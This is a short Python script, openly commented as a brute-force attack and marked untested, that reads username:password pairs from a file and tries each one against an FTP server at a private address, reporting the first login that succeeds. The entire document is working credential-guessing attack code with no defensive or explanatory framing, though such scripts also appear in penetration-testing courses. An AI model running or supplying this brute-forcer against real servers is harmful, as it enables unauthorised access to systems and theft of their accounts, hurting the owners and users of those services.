#This script add a function of brute force attack
#This script have not tested 
import ftplib
def brutelogin(hostname,passwordfile):
	passwordfile=open(passwordfile,'r')
	for line in passwordfile.readlines():
		username=line.split(':')[0]
		password=line.split(':')[1].strip('\r').strip('\n')
		print ("[+] Trying:"+username+"/"+password)
		try:
			ftp=ftplib.FTP(hostname)
			ftp.login(username,password)
			print ('\n[*]'+str(hostname)+'ftp login succeeded'+username+"/"+password)
			ftp.quit()
			return (username,password)
		except Exception as e:
			pass
	print ('\n[-] Could not brute force Ftp credentials.')
	return(None,None)
host='192.168.1.123'
passwordfile='ftp_userpassword.txt'
brutelogin(host,passwordfile)
		 
